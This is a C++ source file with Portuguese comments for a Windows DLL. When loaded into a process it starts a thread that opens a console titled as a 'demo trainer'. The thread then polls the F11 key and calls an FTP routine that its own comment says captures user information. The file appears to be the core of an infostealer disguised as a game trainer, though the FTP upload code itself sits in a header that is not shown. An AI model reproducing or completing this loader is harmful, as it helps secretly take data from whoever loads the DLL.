#include <Windows.h>
#include <process.h>
#include <string>
#include <iostream>
#include "conectionFTP.h"
#pragma warning(disable:4996) //desabilitar mensagem de depreciação de "_CRT_SECURE_NO_WARNINGS"


//---------------------------------
using namespace std;


void ManipulaMascara() {
	__try {//Captura informações de usuário!
		if (GetKeyState(VK_F11) < 0) {
			SendForMySessionFTP();
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		//... tratar exceção
	}
}

void imprime() {
	AllocConsole();
	freopen("CONOUT$", "w", stdout);
	SetConsoleTitle("Um Trainer demonstrativo!");
}

void thread(void* data) {
	imprime();
	while (true) {
		ManipulaMascara();
	}
}

BOOL WINAPI DllMain(HINSTANCE hModule, DWORD dwReason, LPVOID lpvReserved) {
	if (dwReason == DLL_PROCESS_ATTACH) {
		(HANDLE)_beginthread(&thread, 0, 0);
	}
	return true;
}



